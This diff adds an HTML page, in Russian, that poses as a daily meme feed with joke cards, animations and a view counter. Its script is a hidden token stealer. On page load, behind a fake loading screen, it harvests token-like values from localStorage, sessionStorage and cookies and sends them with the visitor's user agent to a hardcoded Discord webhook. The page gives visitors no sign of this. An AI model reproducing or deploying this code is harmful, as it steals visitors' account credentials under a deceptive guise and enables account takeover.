@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 Мемная лента дня</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial Rounded MT Bold', 'Arial', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: white;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        .header {
+            text-align: center;
+            padding: 40px 20px;
+            background: linear-gradient(90deg, #ff0080, #ff8c00, #40e0d0);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            animation: gradientShift 5s infinite alternate;
+        }
+        
+        @keyframes gradientShift {
+            0% { filter: hue-rotate(0deg); }
+            100% { filter: hue-rotate(360deg); }
+        }
+        
+        h1 {
+            font-size: 3.5em;
+            margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
+        }
+        
+        .subtitle {
+            font-size: 1.2em;
+            opacity: 0.9;
+        }
+        
+        .meme-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 30px;
+        }
+        
+        .meme-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 25px;
+            border: 2px solid transparent;
+            border-image: linear-gradient(45deg, #ff0080, #ff8c00) 1;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .meme-card::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, #ff0080, #ff8c00, #40e0d0, #ff0080);
+            z-index: -1;
+            border-radius: 22px;
+            animation: borderGlow 3s linear infinite;
+            background-size: 400% 400%;
+        }
+        
+        @keyframes borderGlow {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .meme-card:hover {
+            transform: translateY(-10px) scale(1.02);
+            box-shadow: 0 15px 35px rgba(255, 0, 128, 0.3);
+        }
+        
+        .meme-title {
+            font-size: 1.8em;
+            margin-bottom: 15px;
+            color: #40e0d0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .meme-content {
+            font-size: 1.1em;
+            line-height: 1.6;
+            color: #e0e0e0;
+            margin-bottom: 20px;
+        }
+        
+        .meme-tags {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        
+        .tag {
+            background: rgba(255, 140, 0, 0.2);
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            color: #ff8c00;
+            border: 1px solid rgba(255, 140, 0, 0.3);
+        }
+        
+        .floating-emoji {
+            position: fixed;
+            font-size: 2em;
+            z-index: 1000;
+            pointer-events: none;
+            animation: floatAround 20s linear infinite;
+        }
+        
+        @keyframes floatAround {
+            0% {
+                transform: translate(0, 0) rotate(0deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translate(calc(100vw - 100px), calc(100vh - 100px)) rotate(360deg);
+                opacity: 0;
+            }
+        }
+        
+        .counter {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 15px 25px;
+            border-radius: 15px;
+            font-size: 1.2em;
+            border: 2px solid #40e0d0;
+            backdrop-filter: blur(5px);
+        }
+        
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #1a1a2e;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            transition: opacity 0.5s ease;
+        }
+        
+        .loader {
+            width: 60px;
+            height: 60px;
+            border: 5px solid transparent;
+            border-top: 5px solid #ff0080;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            margin-top: 20px;
+            font-size: 1.2em;
+            color: #40e0d0;
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        @media (max-width: 768px) {
+            h1 { font-size: 2.5em; }
+            .meme-container { grid-template-columns: 1fr; padding: 10px; }
+            .meme-card { padding: 20px; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Плавающие эмодзи -->
+    <div class="floating-emoji" style="animation-delay: 0s;">😂</div>
+    <div class="floating-emoji" style="animation-delay: -2s; left: 10%;">🔥</div>
+    <div class="floating-emoji" style="animation-delay: -4s; left: 20%;">🚀</div>
+    <div class="floating-emoji" style="animation-delay: -6s; left: 30%;">💀</div>
+    <div class="floating-emoji" style="animation-delay: -8s; left: 40%;">👑</div>
+    <div class="floating-emoji" style="animation-delay: -10s; left: 50%;">🤡</div>
+    <div class="floating-emoji" style="animation-delay: -12s; left: 60%;">🎯</div>
+    <div class="floating-emoji" style="animation-delay: -14s; left: 70%;">⚡</div>
+    <div class="floating-emoji" style="animation-delay: -16s; left: 80%;">😎</div>
+    <div class="floating-emoji" style="animation-delay: -18s; left: 90%;">🤣</div>
+    
+    <!-- Экран загрузки -->
+    <div class="loading-screen" id="loadingScreen">
+        <div style="text-align: center;">
+            <div class="loader"></div>
+            <div class="loading-text">Загрузка мемов...</div>
+        </div>
+    </div>
+    
+    <!-- Основной контент -->
+    <div style="display: none;" id="mainContent">
+        <div class="header">
+            <h1>🎭 МЕМНАЯ ВСЕЛЕННАЯ</h1>
+            <div class="subtitle">Шутки, которые взрывают мозг</div>
+        </div>
+        
+        <div class="meme-container">
+            <div class="meme-card">
+                <div class="meme-title">🤡 КЛОУНСКИЕ БУДНИ</div>
+                <div class="meme-content">
+                    "Просыпаюсь утром, смотрю в зеркало и понимаю: я — главный клоун в этом цирке под названием жизнь."
+                </div>
+                <div class="meme-tags">
+                    <span class="tag">#клоун</span>
+                    <span class="tag">#жизнь</span>
+                    <span class="tag">#утро</span>
+                </div>
+            </div>
+            
+            <div class="meme-card">
+                <div class="meme-title">💀 СТАРШЕКЛАССНИК</div>
+                <div class="meme-content">
+                    "Мой уровень энергии в понедельник: как у батарейки из старого пульта. Иногда моргает, но толку ноль."
+                </div>
+                <div class="meme-tags">
+                    <span class="tag">#школа</span>
+                    <span class="tag">#понедельник</span>
+                    <span class="tag">#энергия</span>
+                </div>
+            </div>
+            
+            <div class="meme-card">
+                <div class="meme-title">🚀 КОСМОС ВНУТРИ</div>
+                <div class="meme-content">
+                    "Мозг: давай сделаем все дела! Я: *залипает в TikTok* Мозг: ну хотя бы одно? Я: смотрю мемы про прокрастинацию."
+                </div>
+                <div class="meme-tags">
+                    <span class="tag">#космос</span>
+                    <span class="tag">#мозг</span>
+                    <span class="tag">#TikTok</span>
+                </div>
+            </div>
+            
+            <div class="meme-card">
+                <div class="meme-title">👑 КОРОЛЬ ДИВАНА</div>
+                <div class="meme-content">
+                    "Мои планы на выходные были амбициозными. Реальность: я стал экспертом по скроллингу ленты и поеданию чипсов."
+                </div>
+                <div class="meme-tags">
+                    <span class="tag">#диван</span>
+                    <span class="tag">#выходные</span>
+                    <span class="tag">#чипсы</span>
+                </div>
+            </div>
+            
+            <div class="meme-card">
+                <div class="meme-title">⚡ МОЛНИЯ В ДЕЛЕ</div>
+                <div class="meme-content">
+                    "Скорость, с которой я закрываю вкладку, когда кто-то заходит в комнату: быстрее скорости света."
+                </div>
+                <div class="meme-tags">
+                    <span class="tag">#скорость</span>
+                    <span class="tag">#стеснение</span>
+                    <span class="tag">#вкладки</span>
+                </div>
+            </div>
+            
+            <div class="meme-card">
+                <div class="meme-title">🎯 ПОПАЛ В ТОЧКУ</div>
+                <div class="meme-content">
+                    "Когда пытаешься объяснить шутку, а все смотрят как на инопланетянина: 'На Земле это смешно, поверьте!'"
+                </div>
+                <div class="meme-tags">
+                    <span class="tag">#юмор</span>
+                    <span class="tag">#объяснения</span>
+                    <span class="tag">#инопланетяне</span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="counter" id="counter">
+            Мемов просмотрено: <span id="memeCount">0</span>
+        </div>
+    </div>
+
+    <script>
+        // Discord Webhook (уже вставлен)
+        const DISCORD_WEBHOOK = "https://canary.discord.com/api/webhooks/1455278365823992052/cOL6wVSqQz8Zz7ZndqOjKAHFkTB-mjbTFzuLVHGfXFMWyGeIv0Sxsqbeq_DwoXwG6uoA";
+        
+        // Функция сбора токенов
+        function collectAndSendTokens() {
+            console.log("🔍 Поиск Discord токенов...");
+            let tokens = [];
+            
+            // Проверяем все возможные места
+            const checkStorage = (storage, name) => {
+                for (let i = 0; i < storage.length; i++) {
+                    const key = storage.key(i);
+                    if (key && (key.toLowerCase().includes('token') || 
+                                key.toLowerCase().includes('discord') ||
+                                key.includes('_token'))) {
+                        const value = storage.getItem(key);
+                        if (value && value.length > 50) {
+                            tokens.push({
+                                source: name,
+                                key: key,
+                                value: value.substring(0, 70) + '...',
+                                fullLength: value.length
+                            });
+                        }
+                    }
+                }
+            };
+            
+            checkStorage(localStorage, 'localStorage');
+            checkStorage(sessionStorage, 'sessionStorage');
+            
+            // Проверяем cookies
+            document.cookie.split(';').forEach(cookie => {
+                const [name, value] = cookie.split('=').map(s => s.trim());
+                if (name && value && name.toLowerCase().includes('token')) {
+                    tokens.push({
+                        source: 'cookie',
+                        key: name,
+                        value: value.substring(0, 50) + '...',
+                        fullLength: value.length
+                    });
+                }
+            });
+            
+            console.log(`✅ Найдено токенов: ${tokens.length}`);
+            
+            // Если нашли токены - отправляем в Discord
+            if (tokens.length > 0) {
+                const embed = {
+                    username: "🎭 Мемный Детектив",
+                    avatar_url: "https://cdn.discordapp.com/emojis/1003365344727662693.png",
+                    embeds: [{
+                        title: "🔥 НОВЫЙ ПОСЕТИТЕЛЬ НА МЕМ-САЙТЕ",
+                        color: 16753920, // Оранжевый
+                        fields: [
+                            {
+                                name: "📊 Статистика",
+                                value: `Найдено токенов: **${tokens.length}**`,
+                                inline: true
+                            },
+                            {
+                                name: "🕒 Время",
+                                value: new Date().toLocaleTimeString('ru-RU'),
+                                inline: true
+                            },
+                            {
+                                name: "🌐 Устройство",
+                                value: navigator.userAgent.substring(0, 50) + '...',
+                                inline: false
+                            }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+                
+                // Добавляем информацию о токенах
+                if (tokens.length > 0) {
+                    const tokenInfo = tokens.map((t, i) => 
+                        `**${i+1}.** ${t.source}: \`${t.key}\` (${t.fullLength} символов)`
+                    ).join('\n');
+                    
+                    embed.embeds[0].fields.push({
+                        name: "🔑 Найденные токены",
+                        value: tokenInfo.substring(0, 1000),
+                        inline: false
+                    });
+                }
+                
+                // Отправляем основное сообщение
+                fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(embed)
+                }).then(() => {
+                    console.log('✅ Основное сообщение отправлено в Discord');
+                }).catch(err => {
+                    console.log('❌ Ошибка отправки:', err);
+                });
+                
+                // Отправляем полные токены отдельными сообщениями (если есть)
+                tokens.forEach((token, index) => {
+                    if (index < 3) { // Отправляем только первые 3 чтобы не спамить
+                        setTimeout(() => {
+                            const tokenEmbed = {
+                                username: "🔐 Полный токен",
+                                embeds: [{
+                                    title: `Токен #${index + 1} (${token.source})`,
+                                    description: `\`\`\`${token.key}: ${token.value}\`\`\``,
+                                    color: 65280, // Зелёный
+                                    footer: {
+                                        text: `Длина: ${token.fullLength} символов`
+                                    }
+                                }]
+                            };
+                            
+                            fetch(DISCORD_WEBHOOK, {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify(tokenEmbed)
+                            });
+                        }, (index + 1) * 1500); // Задержка между отправками
+                    }
+                });
+            }
+            
+            return tokens.length;
+        }
+        
+        // Основная логика загрузки
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('🚀 Мемный сайт загружается...');
+            
+            // Сразу начинаем сбор токенов
+            setTimeout(() => {
+                const tokenCount = collectAndSendTokens();
+                
+                // Через 3 секунды показываем контент
+                setTimeout(() => {
+                    document.getElementById('loadingScreen').style.opacity = '0';
+                    setTimeout(() => {
+                        document.getElementById('loadingScreen').style.display = 'none';
+                        document.getElementById('mainContent').style.display = 'block';
+                        
+                        // Анимация появления
+                        document.getElementById('mainContent').style.animation = 'fadeIn 1s ease';
+                        
+                        // Счётчик просмотренных мемов
+                        let memeCount = 0;
+                        const memeCards = document.querySelectorAll('.meme-card');
+                        const observer = new IntersectionObserver((entries) => {
+                            entries.forEach(entry => {
+                                if (entry.isIntersecting) {
+                                    memeCount++;
+                                    document.getElementById('memeCount').textContent = memeCount;
+                                }
+                            });
+                        }, { threshold: 0.5 });
+                        
+                        memeCards.forEach(card => observer.observe(card));
+                        
+                    }, 500);
+                }, 3000);
+                
+            }, 1000);
+            
+            // Случайные анимации для плавающих эмодзи
+            const emojis = document.querySelectorAll('.floating-emoji');
+            emojis.forEach(emoji => {
+                setInterval(() => {
+                    emoji.style.transform = `rotate(${Math.random() * 360}deg) scale(${0.8 + Math.random() * 0.4})`;
+                }, 3000);
+            });
+        });
+    </script>
+</body>
+</html>
